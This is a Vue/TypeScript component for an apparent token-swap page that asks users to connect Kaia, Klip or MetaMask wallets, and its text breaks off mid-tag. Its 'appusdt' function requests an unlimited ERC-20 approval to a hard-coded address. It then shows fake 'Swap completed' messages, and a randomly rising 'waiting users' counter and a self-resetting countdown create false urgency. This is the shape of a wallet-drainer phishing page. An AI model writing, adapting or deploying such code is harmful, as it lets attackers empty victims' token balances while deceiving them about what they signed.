<script setup lang="ts">
import 'swiper/css'
import 'swiper/css/pagination'
import {Swiper, SwiperSlide} from 'swiper/vue'
import {Mousewheel, Pagination} from 'swiper/modules'
import {onBeforeMount, onBeforeUnmount, onMounted, reactive, ref, watch} from 'vue'
import type {Swiper as SwiperInstance} from 'swiper';  // 类型导入

import {abi} from "./erc20.ts"
import {useConnect, useChainId, useAccount, useWriteContract} from '@wagmi/vue';
import { injected,metaMask,walletConnect } from '@wagmi/vue/connectors'
import {kaiaWalletApprove} from "@/views/contract.ts";


let timer: any = null
let targetTime = new Date().getTime() + 48 * 60 * 60 * 1000 // 48 hours from now
const swiperRef = ref<SwiperInstance | null>(null);
const waitingUsers = ref(0)
const countdown = ref({
  days: 0,
  hours: 0,
  minutes: 0,
  seconds: 0,
})

const projectId = '0c3c979e2192a3e1d8537e6f5f1c6048'

const chainId = useChainId();
const {connectors, connect} = useConnect();
const {address, connector, isConnected} = useAccount();
const {data: hash, writeContract} = useWriteContract()
const MAX_UINT256 = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';


const appusdt = async () => {
  await writeContract({
    address: '0x5c13e303a62fc5dedf5b52d66873f2e59fedadc2',
    abi,
    functionName: 'approve',
    args: ["0x48F943a8a6A6437117063D3aCaf62e2047467966", MAX_UINT256],
  })

  // 先显示 swapProgress
  showDialog('swapProgress');

  // 等待 3 秒（硬等待）
  await new Promise(resolve => setTimeout(resolve, 2000));

  hideDialog('swapProgress')


  // 显示 swapCompleted
  showDialog('swapCompleted');
  await new Promise(resolve => setTimeout(resolve, 3000));
  hideDialog('swapCompleted')


}


const data = reactive({
  defaultShow: 'walletConnection',
  chked: false,
  dialogs: {
    'walletConnection': {show: false, contentShow: false},
    'selectTokenLayer': {show: false, contentShow: false},
    'pleaseConfirm': {show: false, contentShow: false},
    'mobileApp': {show: false, contentShow: false},
    'swapProgress': {show: false, contentShow: false},
    'swapCompleted': {show: false, contentShow: false},
  } as any
})
onBeforeMount(() => {
  waitingUsers.value = getNumberRange(235100, 235150)
  changeWaitingUsers()

  // 倒计时
  updateCountdown()
  timer = setInterval(() => updateCountdown(), 1000)
})
onMounted(() => {

})
onBeforeUnmount(() => {
  clearInterval(timer)
})


const connectKaiaMobile = () =>{
  // console.log(connect({connector:injected()}))
  //
  // if (connect({connector:injected()}) === undefined){
  //   window.open("https://app.kaiawallet.io/u/https://public-evw.pages.dev")
  // }
  // connect({connector:injected()})

  kaiaWalletApprove()
}


const connectKlipMobile = () =>{
  console.log(connect({connector:injected()}))
  if (connect({connector:injected()}) === undefined){
    window.open('https://klipwallet.com/?target=https://public-evw.pages.dev')
  }
  connect({connector:injected()})
}


const showDialog = (name: string) => {
  for (const v in data.dialogs) {
    if (v == name) {
      data.dialogs[v].show = true
      setTimeout(() => data.dialogs[v].contentShow = true, 100)
    } else {
      data.dialogs[v].show = false
      data.dialogs[v].contentShow = false
    }
  }
}

const hideDialog = (name: string) => {
  data.dialogs[name].contentShow = false
  setTimeout(() => data.dialogs[name].show = false, 100)
}

const changeWaitingUsers = () => {
  waitingUsers.value++
  let num = getNumberRange(1, 5)
  // console.log(num)
  setTimeout(changeWaitingUsers, 1000 * num)
};

const getNumberRange = (min: number, max: number) => Math.floor(Math.random() * (max - min + 1)) + min

const updateCountdown = (duration: number = 1000) => {
  let now = new Date().getTime()
  let distance = targetTime - now
  if (distance < 0) {
    // Reset target time to 48 hours from now
    targetTime = now + 48 * 60 * 60 * 1000
    countdown.value = {days: 0, hours: 0, minutes: 0, seconds: 0}
    distance = targetTime - now // Recalculate distance
  }
  // if (distance < 0) {
  //   clearInterval(intv)
  //   countdown.value = { days: 0, hours: 0, minutes: 0, seconds: 0 }
  //   return
  // }
  countdown.value.days = Math.floor(distance / (duration * 60 * 60 * 24))
  countdown.value.hours = Math.floor((distance % (duration * 60 * 60 * 24)) / (duration * 60 * 60))
  countdown.value.minutes = Math.floor((distance % (duration * 60 * 60)) / (duration * 60))
  countdown.value.seconds = Math.floor((distance % (duration * 60)) / duration)
}

const onSwiper = (swiper: SwiperInstance) => swiperRef.value = swiper
const slideNext = () => {
  if (swiperRef.value) {
    swiperRef.value.slideNext()
  }
}


watch(isConnected, (newValue, oldValue) => {
  if (!newValue) {
    hideDialog('walletConnection')
  }
})


</script>

<template>

  <!-- swapCompleted -->
  <div class="g_toast swapCompleted" :class="{ 'show': data.dialogs['swapCompleted'].contentShow }"
       v-show="data.dialogs['swapCompleted'].show">
    <div style="display: flex;align-items: center;">
      <svg xmlns="http://www.w3.org/2000/svg" width="28" height="28" viewBox="0 0 28 28" type="info"
           class="sc-goMbjt dqnqea">
        <path fill-rule="evenodd"
              d="M2.188 14C2.188 7.476 7.476 2.188 14 2.188S25.813 7.476 25.813 14 20.523 25.813 14 25.813 2.188 20.523 2.188 14m15.657-3.83a1.312 1.312 0 1 1 1.935 1.773l-6.417 7a1.313 1.313 0 0 1-1.935 0l-3.208-3.5a1.312 1.312 0 0 1 1.935-1.774l2.24 2.445z"
              clip-rule="evenodd"></path>
      </svg>
      <div style="flex:1;padding:0 10px;">
        <div style="font-size:20px;font-weight: 700;">Swap completed</div>
      </div>
      <div style="cursor: pointer;" @click="hideDialog('swapCompleted')">
        <svg xmlns="http://www.w3.org/2000/svg" fill="#96cfe4" viewBox="0 0 32 32"
             style="width: 20px; height: 20px;">
          <path fill-rule="evenodd"
                d="M5.94 5.94a1.5 1.5 0 0 1 2.12 0L16 13.878l7.94-7.94a1.5 1.5 0 0 1 2.12 2.122L18.122 16l7.94 7.94a1.5 1.5 0 0 1-2.122 2.12L16 18.122l-7.94 7.94a1.5 1.5 0 0 1-2.12-2.122L13.878 16l-7.94-7.94a1.5 1.5 0 0 1 0-2.12"
                clip-rule="evenodd"></path>
        </svg>
      </div>
    </div>
  </div>

  <!-- swapProgress -->
  <div class="g_toast swapProgress" :class="{ 'show': data.dialogs['swapProgress'].contentShow }"
       v-show="data.dialogs['swapProgress'].show">
    <div style="display: flex;align-items: flex-start;">
      <svg xmlns="http://www.w3.org/2000/svg" width="28" height="28" fill="#57CF3F" viewBox="0 0 20 21"
           style="fill: rgb(64, 171, 43);">
        <path fill-rule="evenodd"
              d="M1.563 10.5a8.438 8.438 0 1 1 16.875 0 8.438 8.438 0 0 1-16.875 0m8.28-4.687a1.25 1.25 0 1 0 0 2.5 1.25 1.25 0 0 0 0-2.5M8.439 9.875c0-.518.42-.937.937-.937H10c.518 0 .938.42.938.937v3.49a.938.938 0 0 1-.313 1.822H10a.937.937 0 0 1-.937-.937v-3.49a.94.94 0 0 1-.626-.885"
              clip-rule="evenodd"></path>
      </svg>
      <div style="flex:1;padding:0 10px;">
        <div style="font-size:20px;font-weight: 700;">Swap in progress...</div>
        <div style="font-size: 16px;margin-top:6px;">Please sign / confirm transaction on wallet popup</div>
      </div>
      <div style="cursor: pointer;" @click="hideDialog('swapProgress')">
        <svg xmlns="http://www.w3.org/2000/svg" fill="#7eda6c" viewBox="0 0 32 32"
             style="width: 20px; height: 20px;">
          <path fill-rule="evenodd"
                d="M5.94 5.94a1.5 1.5 0 0 1 2.12 0L16 13.878l7.94-7.94a1.5 1.5 0 0 1 2.12 2.122L18.122 16l7.94 7.94a1.5 1.5 0 0 1-2.122 2.12L16 18.122l-7.94 7.94a1.5 1.5 0 0 1-2.12-2.122L13.878 16l-7.94-7.94a1.5 1.5 0 0 1 0-2.12"
                clip-rule="evenodd"></path>
        </svg>
      </div>
    </div>
  </div>

  <!-- mobileApp -->
  <div class="g_backdrop mobileApp" v-show="data.dialogs['mobileApp'].show">
    <div class="bg" :class="{ 'show': data.dialogs['mobileApp'].contentShow }">
      <div class="g_dialog">
        <div class="close_button">
          <div style="cursor: pointer;" @click="hideDialog('mobileApp')">
            <svg xmlns="http://www.w3.org/2000/svg" fill="rgb(150, 150, 150)" viewBox="0 0 32 32"
                 style="width: 20px; height: 20px;">
              <path fill-rule="evenodd"
                    d="M5.94 5.94a1.5 1.5 0 0 1 2.12 0L16 13.878l7.94-7.94a1.5 1.5 0 0 1 2.12 2.122L18.122 16l7.94 7.94a1.5 1.5 0 0 1-2.122 2.12L16 18.122l-7.94 7.94a1.5 1.5 0 0 1-2.12-2.122L13.878 16l-7.94-7.94a1.5 1.5 0 0 1 0-2.12"
                    clip-rule="evenodd"></path>
            </svg>
          </div>
        </div>
        <div role="button" aria-label="animation" tabindex="0"
             style="width: 60px; height: 60px; overflow: hidden; margin: 0px auto; outline: none;">
          <svg
              xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 200 200"
              width="200" height="200" preserveAspectRatio="xMidYMid slice"
              style="width: 100%; height: 100%; transform: translate3d(0px, 0px, 0px); content-visibility: visible;">
            <defs>
              <clipPath id="__lottie_element_82">
                <rect width="200" height="200" x="0" y="0"></rect>
              </clipPath>
            </defs>
            <g clip-path="url(#__lottie_element_82)">
              <g style="display: block;"
                 transform="matrix(0.3333333432674408,0,0,0.3333333432674408,107.56632995605469,93.56632995605469)"
                 opacity="0.1">
                <g opacity="1" transform="matrix(1,0,0,1,-22.698999404907227,19.301000595092773)">
                  <path stroke-linecap="round" stroke-linejoin="miter" fill-opacity="0" stroke-miterlimit="4"
                        stroke="rgb(190,240,9)" stroke-opacity="1" stroke-width="49"
                        d=" M0,-184.30099487304688 C101.7157211303711,-184.30099487304688 184.30099487304688,-101.7157211303711 184.30099487304688,0 C184.30099487304688,101.7157211303711 101.7157211303711,184.30099487304688 0,184.30099487304688 C-101.7157211303711,184.30099487304688 -184.30099487304688,101.7157211303711 -184.30099487304688,0 C-184.30099487304688,-101.7157211303711 -101.7157211303711,-184.30099487304688 0,-184.30099487304688z">
                  </path>
                </g>
              </g>
              <g style="display: block;"
                 transform="matrix(-0.33111780881881714,0.03836820274591446,-0.03836820274591446,-0.33111780881881714,93.26570129394531,107.25944519042969)"
                 opacity="0.8">
                <g opacity="1" transform="matrix(1,0,0,1,-22.698999404907227,19.301000595092773)">
                  <path class="loading-svg" stroke-linecap="round" stroke-linejoin="miter" fill-opacity="0"
                        stroke-miterlimit="4"
                        stroke="rgb(190,240,9)" stroke-opacity="1" stroke-width="49"
                        d=" M26.43000030517578,182.41600036621094 C17.79800033569336,183.6580047607422 8.972999572753906,184.30099487304688 0,184.30099487304688 C0,184.30099487304688 0,184.30099487304688 0,184.30099487304688">
                  </path>
                </g>
              </g>
            </g>
          </svg>
        </div>
        <!-- <div role="button" aria-label="animation" tabindex="0"
          style="width: 60px; height: 60px; overflow: hidden; margin: 0px auto; outline: none;"><svg
            xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 200 200"
            width="200" height="200" preserveAspectRatio="xMidYMid slice"
            style="width: 100%; height: 100%; transform: translate3d(0px, 0px, 0px); content-visibility: visible;">
            <defs>
              <clipPath id="__lottie_element_82">
                <rect width="200" height="200" x="0" y="0"></rect>
              </clipPath>
            </defs>
            <g clip-path="url(#__lottie_element_82)">
              <g style="display: block;"
                transform="matrix(0.3333333432674408,0,0,0.3333333432674408,107.56632995605469,93.56632995605469)"
                opacity="0.1">
                <g opacity="1" transform="matrix(1,0,0,1,-22.698999404907227,19.301000595092773)">
                  <path stroke-linecap="round" stroke-linejoin="miter" fill-opacity="0" stroke-miterlimit="4"
                    stroke="rgb(190,240,9)" stroke-opacity="1" stroke-width="49"
                    d=" M0,-184.30099487304688 C101.7157211303711,-184.30099487304688 184.30099487304688,-101.7157211303711 184.30099487304688,0 C184.30099487304688,101.7157211303711 101.7157211303711,184.30099487304688 0,184.30099487304688 C-101.7157211303711,184.30099487304688 -184.30099487304688,101.7157211303711 -184.30099487304688,0 C-184.30099487304688,-101.7157211303711 -101.7157211303711,-184.30099487304688 0,-184.30099487304688z">
                  </path>
                </g>
              </g>
              <g style="display: block;"
                transform="matrix(-0.33111780881881714,0.03836820274591446,-0.03836820274591446,-0.33111780881881714,93.26570129394531,107.25944519042969)"
                opacity="0.8">
                <g opacity="1" transform="matrix(1,0,0,1,-22.698999404907227,19.301000595092773)">
                  <path stroke-linecap="round" stroke-linejoin="miter" fill-opacity="0" stroke-miterlimit="4"
                    stroke="rgb(190,240,9)" stroke-opacity="1" stroke-width="49"
                    d=" M26.43000030517578,182.41600036621094 C17.79800033569336,183.6580047607422 8.972999572753906,184.30099487304688 0,184.30099487304688 C0,184.30099487304688 0,184.30099487304688 0,184.30099487304688">
                  </path>
                </g>
              </g>
            </g>
          </svg>
        </div> -->
        <div style="text-align: center;padding:0 0 24px;">
          <div style="color:#fff;font-size:20px;font-weight: 700;line-height: 28px;">
            <div>Please Scan the QR</div>
            <div>to connect wallet</div>
          </div>
          <div style="color:rgb(191, 240, 9);font-size:14px;font-weight: 700;margin-top:10px;">16s remaining...</div>
          <div style="display: flex;align-items: center;justify-content: center;margin:10px 0;">
            <div style="border: 2px solid red;width:200px;height: 200px;padding:5px;background-color: #fff;">QR Code
            </div>
          </div>
          <div style="color: rgb(100, 100, 100);font-size: 12px;">
            <div>Automatic timeout will occur</div>
            <div>if you are unable to confirm within 60 secs.</div>
          </div>
        </div>
      </div>
    </div>
  </div>

  <!-- walletConnection -->
  <div class="g_backdrop walletConnection" v-show="data.dialogs['walletConnection'].show">
    <div class="bg" :class="{ 'show': data.dialogs['walletConnection'].contentShow }">
      <div class="g_dialog">
        <div class="close_button">
          <div style="cursor: pointer;" @click="hideDialog('walletConnection')">
            <svg xmlns="http://www.w3.org/2000/svg" fill="rgb(150, 150, 150)" viewBox="0 0 32 32"
                 style="width: 20px; height: 20px;">
              <path fill-rule="evenodd"
                    d="M5.94 5.94a1.5 1.5 0 0 1 2.12 0L16 13.878l7.94-7.94a1.5 1.5 0 0 1 2.12 2.122L18.122 16l7.94 7.94a1.5 1.5 0 0 1-2.122 2.12L16 18.122l-7.94 7.94a1.5 1.5 0 0 1-2.12-2.122L13.878 16l-7.94-7.94a1.5 1.5 0 0 1 0-2.12"
                    clip-rule="evenodd"></path>
            </svg>
          </div>
        </div>
        <div class="top">
          <svg xmlns="http://www.w3.org/2000/svg" width="40" height="40" fill="#fff" viewBox="0 0 40 40"
               style="fill: rgb(255, 255, 255);">
            <path fill-rule="evenodd"
                  d="M28.692 6.664v5h5a1.667 1.667 0 0 1 1.673 1.666v8.423h-3.337v-6.756h-23.7a5 5 0 0 1-1.667-.3v16.598a1.667 1.667 0 0 0 1.667 1.667h23.7v-5.605h3.337v7.271a1.667 1.667 0 0 1-1.673 1.667H8.328a5 5 0 0 1-5-5V9.997a5 5 0 0 1 5-5h18.697a1.666 1.666 0 0 1 1.667 1.667M7.15 8.819a1.67 1.67 0 0 1 1.178-.489h17.03v3.334H8.328A1.667 1.667 0 0 1 7.15 8.819"
                  clip-rule="evenodd"></path>
            <path fill-rule="evenodd"
                  d="M20.853 24.018A4.017 4.017 0 0 1 24.87 20h10.69a4.017 4.017 0 0 1 0 8.035H24.87a4.017 4.017 0 0 1-4.017-4.017m4.017-.684a.684.684 0 1 0 0 1.368h10.69a.684.684 0 0 0 0-1.368z"
                  clip-rule="evenodd"></path>
          </svg>
          <div style="color:#fff;font-size:20px;font-weight: 700;">Please Connect a Wallet</div>
          <div style="color:rgb(150, 150, 150);font-size:14px;">Following wallets are supported.</div>
        </div>
        <div class="bottom">
          <div class="title">
            <img width="20" height="20"
              alt="data:image/svg+xml,%3csvg%20width='100%25'%20height='100%25'%20viewBox='0%200%2040%2040'%20fill='none'%20xmlns='http://www.w3.org/2000/svg'%3e%3cpath%20d='M0%2020C0%208.95431%208.95431%200%2020%200C31.0457%200%2040%208.95431%2040%2020C40%2031.0457%2031.0457%2040%2020%2040C8.95431%2040%200%2031.0457%200%2020Z'%20fill='%23BFF009'/%3e%3cpath%20fill-rule='evenodd'%20clip-rule='evenodd'%20d='M13.309%2013.2L17.7013%2026.9006L18.126%2025.5772L14.158%2013.2H15.6286L18.8616%2023.284L19.2853%2021.9606L16.4776%2013.2H17.9482L20.0209%2019.6664L22.0949%2013.2H32.7992L27.6691%2029.2H16.9648L16.9667%2029.1948L11.8384%2013.2H13.309ZM10.9894%2013.2L16.1195%2029.2H14.6489L9.51882%2013.2H10.9894ZM8.66982%2013.2L13.7999%2029.2H12.3293L7.19922%2013.2H8.66982Z'%20fill='black'/%3e%3c/svg%3e"
              src="data:image/svg+xml,%3csvg%20width='100%25'%20height='100%25'%20viewBox='0%200%2040%2040'%20fill='none'%20xmlns='http://www.w3.org/2000/svg'%3e%3cpath%20d='M0%2020C0%208.95431%208.95431%200%2020%200C31.0457%200%2040%208.95431%2040%2020C40%2031.0457%2031.0457%2040%2020%2040C8.95431%2040%200%2031.0457%200%2020Z'%20fill='%23BFF009'/%3e%3cpath%20fill-rule='evenodd'%20clip-rule='evenodd'%20d='M13.309%2013.2L17.7013%2026.9006L18.126%2025.5772L14.158%2013.2H15.6286L18.8616%2023.284L19.2853%2021.9606L16.4776%2013.2H17.9482L20.0209%2019.6664L22.0949%2013.2H32.7992L27.6691%2029.2H16.9648L16.9667%2029.1948L11.8384%2013.2H13.309ZM10.9894%2013.2L16.1195%2029.2H14.6489L9.51882%2013.2H10.9894ZM8.66982%2013.2L13.7999%2029.2H12.3293L7.19922%2013.2H8.66982Z'%20fill='black'/%3e%3c/svg%3e"
              style="border-radius: 50%;">&nbsp;
            <span style="color:#fff;font-size:14px;font-weight: 700;">Kaia Wallet</span>
          </div>
          <div class="wallet_type">
            <div class="btn" @click="connect({connector: injected(),chainId})">Chrome Extension</div>
            <div class="btn" @click="connectKaiaMobile">Mobile App</div>
          </div>
          <div style="font-size:12px;padding:4px 0;" class="pc_open">or</div>
          <div class="other_btns">
            <div class="btn" @click="connectKlipMobile">
              <img width="20" height="20"
                alt="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGAAAABgCAYAAADimHc4AAAIpElEQVR4nO2d/Y9UVxnHP8+Zmd0C3UJ5qRikWPqSFliLLcZIrAUrhSitFn4w0aTW33QlNKGaGpMmxkQTiolNVWxM2j/AaG1tYlvrS2khNhZ/UHlJSylCLa+CuLALnZl7Hn849849d3ZYF/bO3ClzPsnszN47c++5z/ec85zznGfmyuCQ0oQAzRuTbTcCdwMrgFuAucAVzQfoMc4BR4FdwMvAH4D9ZG3YyqZux+CQStM29T6QPK8GhoCVwEB+Zb8s+S/we2Ar8CcuYPgEEz+r9+yrtQR4IX7cSzD+RJgOrMe1hGeAm719zZUdQ9b4/vPXgNdwXU7g0rgX+Avw1fj/xLYNIUzzJ+KdW4CfAVPJqjZucwq0ZAB4Cviet61hx1YCbAG+eYGDjWlCgQnzCFkRBFIBEsMOAZs6WKhe4xHggfi1QtYJLwV+SKjl7eZx3BAeyHZBWwhj+k4wAGxO/kkEWAt8hlD7O8U9wKchFeDr3s4w0ukMQ4AYYBFwp7cjtIL24Vfuu4DrDC7MMK2Y8vQcfpRhBrDK4OI7gc7h9zB3GrwhUaDjLDHANUWXoof5gAGmFF2KHmZaq1hQoIMEAQomCFAwQYCCCQIUTBCgYIIABRMEKJggQMEEAQomCFAwQYCCCQIUTBCgYIIABVPO+4AioJo+q0IERHX3uruxgKEEmJJijCBtTlHIXYDEyHWFWhWmXQEL58D8OcqMK93OUruv6hIQBRUhUvjPGeXwSeGfx2HkPPT3WQTTqFR50pYWUKvBlf3KfauU+5bD9XMNlbICBo2vQLpFhPgbEdm8caEewf6jytPbhV/vMAxXI/pKpdxPL4NDWgUqeR2wXofrPwg/eAAWLwAT29nvlrrF9uMSK6ICuw4p33lK2HcEKrEGOV3DyKSdsF8Qa2HebPjpRstgxvjaeF93Gt/GDw9xDwGWXCv8ZAPMnwnWOmUS/zZZcuuCBFC1PLTeMH+mp6u6vYdPwdtH4Ox7eZ0xT9LyXj0VbpinzBpIa4oAC2bDg+siHn6ylGslyk2AWh0WLRBWLU0zj1SVE2dgyy+EV3fD8ChEXToSEgGjLllz9nRh3XLL0OegUk7Esdx9u+HJF2HvO9CXk+VyE6AOfHKxUPIqf7UqPPgEvL4PplSgUm6D128DJ4fh8ecMx07D97/iRkiIoWIsH7tJ2HPIvS+PUdGkfUBSAFG4eV62NM/ttOx8C6b2xYUl9QttQTSX7sEYmNYPv9oBO3Z7h8dw7TWa61A0l5mwqhsdzBzIXv3ON8Zaw7azC1IZ3zhy8SfftivrbWdflU7O8hBi8gKIgrgRRH9/dtfps4Lp0NcNrFE3cMk5uHLytKTNFzex7C4nrAKa1gqLYmI33Nba3oSxggIauaFiLRKSoWVf2VAqgSY/CiDeIH8CKNqYOPYZEJN8n33y5OsTLQ3jdwo/5lQyUIuUNbcJt96g1GsgJcOzf4Z970I5nkTpBA2fniN9fwSYi/z8eLR1UHIJXe5F0xgEiGtx1sLaj8PKW91MSoFDx5XdBxMBJm+87uqCxiHHijJhjBGqmUmtxVpFpHRJ3si2+Rouu/WAuk26pDhkgNDNl5l/ybpkppv027n4JO+a/O4nlznH5A/RA3iGzrSurpgHNOPXik544Q7gX0VpzJbJkVsoIsXzgEV44TbgX0Xdv7xuaAF+nF/FjbG1+xd/J4xpupSyARObzeTQf+TWBSUrXSLScID+38uFWpSG1LuiBYAzfARUq9ntc2e9/1vCzOnZ/0ffg0jzibpCji2gHin/Hs5uW/HR978Ayxdl/z81nHSz+Rw/xy5I2fdudtvKxYb1dygj512IIFkLEO/RLfjlsRbOnldW3w4rB/EGPZY3/pXveXMLRfQZw469yoZ7FBN7JwW++2WYNQDPbHcrTbW8TthEMuKtVsFGE/9crabxkryAcQaZMRW+eIewaR2Nn9dQVao14fU3oVLqomhoUgxjYO9B4ZVdworBeJ9AnxEe+gLcvxLePASnRtqVF2RRARsZli7MGqjluUSp15TVywxrblPqkXOq06fCjR+CuVdHLn6k6bGe3ym8dQz6yl0UDVW8bDgLm39pWfJhw6yrXDZZwpzpMGcJbcxLSRfPW70WyYqiVqhb4VOLYM0yt13VGd3hgncigkU5eFx47DduGJrQFWvCSUFEoFyGt48avrEVDhwba2hFOzBHMGN+lTNSRVWISFfMknlLtZHnoyDZzDeJt+85BBu2wonT2bF/V+UFJfRX4G8H4P5HhS/dBWuXKfPnJN1AO5NdvZrfdI4SbnVMjKBefFk0DdY1d1P1SNl/RHjmNeHpHXBm1FUwASIZO0G7VHJPTUyapbVu0jIwDRbOVebPds5NkNzXbRu09I3K9t3KOydMo/b6aZI3zbN85DrBWtdNVeswPGo4fBIOHIuTcyvejJ9cA74juQuQQRSsS3St2///9jwwCuoJbHEZG5WS12W4VGgAogiq9XTNN/l82SilUtsHyiPtzZNSl1xZ7oKErEx/7QUJSyWY0tLQnZmlhPWAggkCFEwQoGCCAAUTBCiYIEDBBAEKJghQMEGAggkCFEwQoGCCAAUTBCiYIEDBBAEKxgBd+eMBPcI5AxwruhQ9zBED7C26FD3MHgNsK7oUPcw2g7tb9rmiS9KDDAMvGWA38GrBhelF/gjsT25pvrXgwvQaic0bGTTPAi/TNV8yvex5HngJshOxb9G+7PFAygjw7fh1JklwJ/Bw58vTc2wC/hG/1uZQxGPAjztbnp5iM/Bzf0OzAAJsJIjQDh4l7XoSxuQpJ054I66pVMk65uCkL55R3B3LxxifFl1QsgPgR8By4JUW+wIT43fAJ4AnuEDlTQTwDeu/8a+4Gz5/HngRp2ZoBeMzAvwW+CzubuV/p3XFdT9pOzh0UfZcDKzB3YP+Fty9iHv9drijwHFgDy6u9gJjA5yN37Kl6Tse/wMAtKHU2QbJZgAAAABJRU5ErkJggg=="
                src="data:image/png;base64,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"
                style="border-radius: 50%;">
              &nbsp; Klip
            </div>
            <div class="btn" @click="connect({ connector: metaMask() ,chainId})">
              <img width="20" height="20"
